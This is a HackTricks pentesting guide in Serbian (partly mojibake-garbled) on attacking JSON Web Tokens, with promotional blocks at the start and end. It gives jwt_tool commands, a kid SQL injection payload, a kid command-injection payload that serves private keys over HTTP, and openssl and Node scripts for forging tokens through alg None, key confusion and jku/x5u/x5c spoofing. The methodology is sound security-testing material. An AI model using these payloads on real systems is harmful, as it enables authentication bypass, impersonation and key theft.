# JWT Vulnerabilities (Json Web Tokens)

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJE**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ako vas zanima **hakerska karijera** i hakovanje neuhvatljivog - **zapoÅ¡ljavamo!** (_potrebno je teÄno poznavanje poljskog jezika u pisanju i govoru_).

{% embed url="https://www.stmcyber.com/careers" %}

**Deo ovog posta je zasnovan na sjajnom postu:** [**https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology**](https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology)\
**Autor odliÄnog alata za pentestiranje JWT-ova** [**https://github.com/ticarpi/jwt\_tool**](https://github.com/ticarpi/jwt\_tool)

### **Brzi Uspeh**

Pokrenite [**jwt\_tool**](https://github.com/ticarpi/jwt\_tool) sa reÅ¾imom `Svi Testovi!` i saÄekajte zelene linije

```bash
python3 jwt_tool.py -M at \
-t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" \
-rh "Authorization: Bearer eyJhbG...<JWT Token>"
```

Ako imate sreÄ‡e, alat Ä‡e pronaÄ‡i sluÄaj gde web aplikacija neispravno proverava JWT:

![](<../.gitbook/assets/image (435).png>)

Zatim moÅ¾ete pretraÅ¾iti zahtev u svom proxy-ju ili izlistati koriÅ¡Ä‡eni JWT za taj zahtev koristeÄ‡i jwt\_ alat:

```bash
python3 jwt_tool.py -Q "jwttool_706649b802c9f5e41052062a3787b291"
```

### Menjanje podataka bez modifikacije

MoÅ¾ete jednostavno menjati podatke ostavljajuÄ‡i potpis nepromenjen i proveriti da li server proverava potpis. PokuÅ¡ajte da promenite svoje korisniÄko ime na "admin" na primer.

#### **Da li se token proverava?**

Da biste proverili da li se potpis JWT-a proverava:

* Poruka o greÅ¡ci sugeriÅ¡e da se vrÅ¡i provera; osetljivi detalji u opÅ¡irnim greÅ¡kama treba da budu pregledani.
* Promena na vraÄ‡enoj stranici takoÄ‘e ukazuje na proveru.
* Bez promene sugeriÅ¡e da nema provere; tada je vreme za eksperimentisanje sa menjanjem tvrdnji o podacima.

### Poreklo

VaÅ¾no je utvrditi da li je token generisan na serverskoj ili klijentskoj strani pregledom istorije zahteva proksija.

* Tokeni prvi put viÄ‘eni sa klijentske strane sugeriÅ¡u da bi kljuÄ mogao biti izloÅ¾en klijentskom kodu, Å¡to zahteva dalje istraÅ¾ivanje.
* Tokeni koji potiÄu sa serverske strane ukazuju na siguran proces.

### Trajanje

Proverite da li token traje viÅ¡e od 24 sata... moÅ¾da nikada ne istiÄe. Ako postoji polje "exp", proverite da li server pravilno rukuje njime.

### Brute-force HMAC tajni kljuÄ

[**Pogledajte ovu stranicu.**](../generic-methodologies-and-resources/brute-force.md#jwt)

### Promenite algoritam u None (CVE-2015-9235)

Postavite koriÅ¡Ä‡eni algoritam kao "None" i uklonite deo sa potpisom.

Koristite Burp ekstenziju "JSON Web Token" da biste isprobali ovu ranjivost i promenili razliÄite vrednosti unutar JWT-a (poÅ¡aljite zahtev Repeateru i u kartici "JSON Web Token" moÅ¾ete da menjate vrednosti tokena. TakoÄ‘e moÅ¾ete odabrati da postavite vrednost polja "Alg" na "None").

### Promenite algoritam RS256(asimetriÄni) u HS256(simetriÄni) (CVE-2016-5431/CVE-2016-10555)

Algoritam HS256 koristi tajni kljuÄ za potpisivanje i proveru svake poruke.\
Algoritam RS256 koristi privatni kljuÄ za potpisivanje poruke i koristi javni kljuÄ za autentifikaciju.

Ako promenite algoritam sa RS256 na HS256, serverski kod koristi javni kljuÄ kao tajni kljuÄ, a zatim koristi algoritam HS256 za proveru potpisa.

Zatim, koristeÄ‡i javni kljuÄ i menjanjem RS256 u HS256, mogli bismo kreirati validan potpis. MoÅ¾ete dobiti sertifikat veb servera koji izvrÅ¡ava ovo:

```bash
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem #For this attack you can use the JOSEPH Burp extension. In the Repeater, select the JWS tab and select the Key confusion attack. Load the PEM, Update the request and send it. (This extension allows you to send the "non" algorithm attack also). It is also recommended to use the tool jwt_tool with the option 2 as the previous Burp Extension does not always works well.
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```

### Novi javni kljuÄ unutar zaglavlja

NapadaÄ ugraÄ‘uje novi kljuÄ u zaglavlje tokena, a server koristi ovaj novi kljuÄ za proveru potpisa (CVE-2018-0114).

Ovo se moÅ¾e uraditi pomoÄ‡u "JSON Web Tokens" Burp ekstenzije.\
(PoÅ¡aljite zahtev Repeater-u, unutar kartice JSON Web Token odaberite "CVE-2018-0114" i poÅ¡aljite zahtev).

### JWKS Prevara

Uputstva detaljno opisuju metod za procenu sigurnosti JWT tokena, posebno onih koji koriste "jku" zaglavlje. Ovaj zahtev treba da vodi ka JWKS (JSON Web Key Set) fajlu koji sadrÅ¾i javni kljuÄ neophodan za verifikaciju tokena.

* **Procena Tokena sa "jku" Zaglavljem**:
* Proverite URL "jku" zahteva kako biste bili sigurni da vodi ka odgovarajuÄ‡em JWKS fajlu.
* Modifikujte vrednost "jku" tokena da usmeri ka kontrolisanom web servisu, omoguÄ‡avajuÄ‡i posmatranje saobraÄ‡aja.
* **Pratite HTTP Interakciju**:
* Posmatranje HTTP zahteva ka vaÅ¡em odreÄ‘enom URL-u ukazuje na serverove pokuÅ¡aje da preuzme kljuÄeve sa vaÅ¡e pruÅ¾ene veze.
* Prilikom koriÅ¡Ä‡enja `jwt_tool` za ovaj proces, vaÅ¾no je aÅ¾urirati `jwtconf.ini` fajl sa lokacijom vaÅ¡eg liÄnog JWKS kako biste olakÅ¡ali testiranje.
* **Komanda za `jwt_tool`**:
* IzvrÅ¡ite sledeÄ‡u komandu da simulirate scenario sa `jwt_tool`:

```bash
python3 jwt_tool.py JWT_OVDE -X s
```

### Pregled Problema sa "kid"

Opcioni zaglavlje poznato kao `kid` se koristi za identifikaciju odreÄ‘enog kljuÄa, Å¡to postaje posebno vaÅ¾no u okruÅ¾enjima gde postoji viÅ¡e kljuÄeva za verifikaciju potpisa tokena. Ovaj zahtev pomaÅ¾e u odabiru odgovarajuÄ‡eg kljuÄa za verifikaciju potpisa tokena.

#### Otkrivanje KljuÄa putem "kid"

Kada je `kid` zahtev prisutan u zaglavlju, preporuÄuje se pretraÅ¾ivanje web direktorijuma za odgovarajuÄ‡i fajl ili njegove varijacije. Na primer, ako je `"kid":"kljuÄ/12345"` naveden, fajlovi _/kljuÄ/12345_ i _/kljuÄ/12345.pem_ treba da se pretraÅ¾e u web root-u.

#### Putanja Traversiranja sa "kid"

`kid` zahtev takoÄ‘e moÅ¾e biti iskoriÅ¡Ä‡en za navigaciju kroz sistem fajlova, potencijalno omoguÄ‡avajuÄ‡i izbor proizvoljnog fajla. MoguÄ‡e je testirati konektivnost ili izvrÅ¡iti Server-Side Request Forgery (SSRF) napade menjanjem vrednosti `kid` da cilja odreÄ‘ene fajlove ili servise. Manipulisanje JWT-a za promenu vrednosti `kid` dok se zadrÅ¾ava originalni potpis moÅ¾e se postiÄ‡i koriÅ¡Ä‡enjem `-T` zastave u jwt\_tool, kako je prikazano ispod:

```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```

### Napad na JWT putem "kid"

Ciljanjem datoteka sa predvidljivim sadrÅ¾ajem moguÄ‡e je falsifikovati validan JWT. Na primer, datoteka `/proc/sys/kernel/randomize_va_space` u Linux sistemima, poznata po vrednosti **2**, moÅ¾e se koristiti u parametru `kid` sa **2** kao simetriÄnom lozinkom za generisanje JWT-a.

#### SQL Injection putem "kid"

Ako se sadrÅ¾aj tvrdnje `kid` koristi za dohvat lozinke iz baze podataka, SQL injection moÅ¾e biti olakÅ¡ana modifikovanjem `kid` payload-a. Primer payload-a koji koristi SQL injection za izmenu procesa potpisa JWT-a ukljuÄuje:

`non-existent-index' UNION SELECT 'ATTACKER';-- -`

Ova izmena prisiljava koriÅ¡Ä‡enje poznatog tajnog kljuÄa, `ATTACKER`, za potpisivanje JWT-a.

#### OS Injection putem "kid"

Scenario u kojem parametar `kid` specificira putanju datoteke koja se koristi unutar konteksta izvrÅ¡avanja komande moÅ¾e dovesti do ranjivosti na udaljeno izvrÅ¡avanje koda (RCE). Ubacivanjem komandi u parametar `kid`, moguÄ‡e je otkriti privatne kljuÄeve. Primer payload-a za postizanje RCE-a i otkrivanje kljuÄeva je:

`/root/res/keys/secret7.key; cd /root/res/keys/ && python -m SimpleHTTPServer 1337&`

### x5u i jku

#### jku

jku oznaÄava **JWK Set URL**.\
Ako token koristi "jku" **Header** tvrdnju, **proverite pruÅ¾enu URL**. Ova URL bi trebalo da pokazuje ka URL-u koji sadrÅ¾i JWKS datoteku koja drÅ¾i javni kljuÄ za proveru tokena. Modifikujte token da jku vrednost pokazuje ka web servisu za koji moÅ¾ete pratiti saobraÄ‡aj.

Prvo morate kreirati novi sertifikat sa novim privatnim i javnim kljuÄevima.

```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```

Zatim moÅ¾ete koristiti na primer [**jwt.io**](https://jwt.io) da biste kreirali novi JWT sa **kreiranim javnim i privatnim kljuÄevima i usmerili parametar jku ka kreiranom sertifikatu.** Da biste kreirali validan jku sertifikat, moÅ¾ete preuzeti originalni i promeniti potrebne parametre.

Parametre "e" i "n" moÅ¾ete dobiti iz javnog sertifikata koriÅ¡Ä‡enjem:

```bash
from Crypto.PublicKey import RSA
fp = open("publickey.crt", "r")
key = RSA.importKey(fp.read())
fp.close()
print("n:", hex(key.n))
print("e:", hex(key.e))
```

#### x5u

X.509 URL. URI koji pokazuje na set X.509 (standard formata sertifikata) javnih sertifikata kodiranih u PEM formatu. Prvi sertifikat u setu mora biti onaj koji se koristi za potpisivanje ovog JWT-a. Svaki sledeÄ‡i sertifikat potpisuje prethodni, Äime se zavrÅ¡ava lanac sertifikata. X.509 je definisan u RFC 5280. Potrebna je transportna sigurnost za prenos sertifikata.

PokuÅ¡ajte **promeniti ovaj zaglavlje u URL pod vaÅ¡om kontrolom** i proverite da li je primljen bilo kakav zahtev. U tom sluÄaju **biste mogli da manipuliÅ¡ete JWT-om**.

Da biste falsifikovali novi token koristeÄ‡i sertifikat koji kontroliÅ¡ete, morate kreirati sertifikat i izdvojiti javne i privatne kljuÄeve:

```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem
```

Zatim moÅ¾ete koristiti na primer [**jwt.io**](https://jwt.io) da biste kreirali novi JWT sa **kreiranim javnim i privatnim kljuÄevima i usmeravanjem parametra x5u na sertifikat .crt kreiran.**

![](<../.gitbook/assets/image (439).png>)

TakoÄ‘e moÅ¾ete zloupotrebiti oba ova propusta **za SSRF napade**.

#### x5c

Ovaj parametar moÅ¾e sadrÅ¾ati **sertifikat u base64 formatu**:

![](<../.gitbook/assets/image (440).png>)

Ako napadaÄ **generiÅ¡e samopotpisani sertifikat** i kreira laÅ¾ni token koristeÄ‡i odgovarajuÄ‡i privatni kljuÄ i zameni vrednost parametra "x5c" sa novo generisanim sertifikatom i modifikuje druge parametre, taÄnije n, e i x5t, tada bi laÅ¾ni token biti prihvaÄ‡en od strane servera.

```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -outattacker.crt
openssl x509 -in attacker.crt -text
```

### UgraÄ‘eni javni kljuÄ (CVE-2018-0114)

Ako JWT ima ugraÄ‘en javni kljuÄ kao u sledeÄ‡em scenariju:

![](<../.gitbook/assets/image (438).png>)

KoriÅ¡Ä‡enjem sledeÄ‡eg nodejs skripta moguÄ‡e je generisati javni kljuÄ iz tih podataka:

```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
n ="â€‹ANQ3hoFoDxGQMhYOAc6CHmzz6_Z20hiP1Nvl1IN6phLwBj5gLei3e4e-DDmdwQ1zOueacCun0DkX1gMtTTX36jR8CnoBRBUTmNsQ7zaL3jIU4iXeYGuy7WPZ_TQEuAO1ogVQudn2zTXEiQeh-58tuPeTVpKmqZdS3Mpum3l72GHBbqggo_1h3cyvW4j3QM49YbV35aHV3WbwZJXPzWcDoEnCM4EwnqJiKeSpxvaClxQ5nQo3h2WdnV03C5WuLWaBNhDfC_HItdcaZ3pjImAjo4jkkej6mW3eXqtmDX39uZUyvwBzreMWh6uOu9W0DMdGBbfNNWcaR5tSZEGGj2divE8"â€‹;
e = "AQAB";
const key = new NodeRSA();
var importedKey = key.importKey({n: Buffer.from(n, 'base64'),e: Buffer.from(e, 'base64'),}, 'components-public');
console.log(importedKey.exportKey("public"));
```

MoguÄ‡e je generisati novi privatni/javni kljuÄ, ugraditi novi javni kljuÄ unutar tokena i koristiti ga za generisanje nove potpisa:

```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```

MoÅ¾ete dobiti "n" i "e" pomoÄ‡u ovog Node.js skripta:

```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
keyPair = fs.readFileSync("keypair.pem");
const key = new NodeRSA(keyPair);
const publicComponents = key.exportKey('components-public');
console.log('Parameter n: ', publicComponents.n.toString("hex"));
console.log('Parameter e: ', publicComponents.e.toString(16));
```

### ES256: Otkrivanje privatnog kljuÄa sa istim nonce-om

Ako neke aplikacije koriste ES256 i koriste isti nonce za generisanje dva JWT-a, privatni kljuÄ moÅ¾e biti obnovljen.

Evo primera: [ECDSA: Otkrivanje privatnog kljuÄa, ako se koristi isti nonce (sa SECP256k1)](https://asecuritysite.com/encryption/ecd5)

### JTI (JWT ID)

JTI (JWT ID) tvrdnja pruÅ¾a jedinstveni identifikator za JWT token. MoÅ¾e se koristiti kako bi se spreÄilo ponovno slanje tokena.\
MeÄ‘utim, zamislite situaciju gde je maksimalna duÅ¾ina ID-a 4 (0001-9999). Zahtevi 0001 i 10001 Ä‡e koristiti isti ID. Dakle, ako backend poveÄ‡ava ID za svaki zahtev, moÅ¾ete zloupotrebiti ovo da **ponovite zahtev** (potrebno je poslati 10000 zahteva izmeÄ‘u svakog uspeÅ¡nog ponavljanja).

### JWT Registrovane tvrdnje

{% embed url="https://www.iana.org/assignments/jwt/jwt.xhtml#claims" %}

### Ostali napadi

**Napadi preko preusmeravanja izmeÄ‘u usluga**

PrimeÄ‡eno je da neke web aplikacije zavise od pouzdane JWT usluge za generisanje i upravljanje njihovim tokenima. ZabeleÅ¾eni su sluÄajevi gde je token, generisan za jednog klijenta od strane JWT usluge, bio prihvaÄ‡en od strane drugog klijenta iste JWT usluge. Ako se primeti izdavanje ili obnavljanje JWT-a putem usluge treÄ‡e strane, treba istraÅ¾iti moguÄ‡nost registracije naloga na drugom klijentu te usluge koristeÄ‡i isto korisniÄko ime/email. Zatim treba pokuÅ¡ati ponoviti dobijeni token u zahtevu cilju da se vidi da li je prihvaÄ‡en.

* Prihvatanje vaÅ¡eg tokena moÅ¾e ukazivati na ozbiljan problem, potencijalno omoguÄ‡avajuÄ‡i falsifikovanje naloga bilo kog korisnika. MeÄ‘utim, treba imati na umu da bi mogla biti potrebna dozvola za Å¡ire testiranje ako se registrujete na aplikaciju treÄ‡e strane, jer to moÅ¾e uÄ‡i u pravnu sivu zonu.

**Provera isteka tokena**

Istek tokena se proverava koriÅ¡Ä‡enjem tvrdnje "exp" Payload. S obzirom da se JWT-ovi Äesto koriste bez informacija o sesiji, potrebno je paÅ¾ljivo rukovati. U mnogim sluÄajevima, hvatanje i ponovno slanje JWT-a drugog korisnika moÅ¾e omoguÄ‡iti preuzimanje identiteta tog korisnika. RFC za JWT preporuÄuje smanjenje rizika od ponovnih napada JWT-om koriÅ¡Ä‡enjem tvrdnje "exp" za postavljanje vremena isteka tokena. Nadalje, implementacija relevantnih provera od strane aplikacije kako bi se osiguralo procesiranje ove vrednosti i odbacivanje isteklih tokena je kljuÄno. Ako token ukljuÄuje tvrdnju "exp" i vremenska ograniÄenja za testiranje to dozvoljavaju, preporuÄuje se Äuvanje tokena i ponovno slanje nakon Å¡to je isteklo vreme isteka. SadrÅ¾aj tokena, ukljuÄujuÄ‡i parsiranje vremenske oznake i proveru isteka (vremenska oznaka u UTC), moÅ¾e se proÄitati koriÅ¡Ä‡enjem zastave -R alata jwt\_tool.

* Postoji rizik za bezbednost ako aplikacija i dalje validira token, jer to moÅ¾e znaÄiti da token nikada ne moÅ¾e isteÄ‡i.

### Alati

{% embed url="https://github.com/ticarpi/jwt_tool" %}

<figure><img src="https://github.com/carlospolop/hacktricks/blob/rs/.gitbook/assets/image%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1).png" alt=""><figcaption></figcaption></figure>

Ako ste zainteresovani za **hakersku karijeru** i hakovanje neuhvatljivog - **zapoÅ¡ljavamo!** (_potrebno je teÄno poznavanje poljskog jezika u pisanju i govoru_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>NauÄite hakovanje AWS-a od poÄetnika do struÄnjaka sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
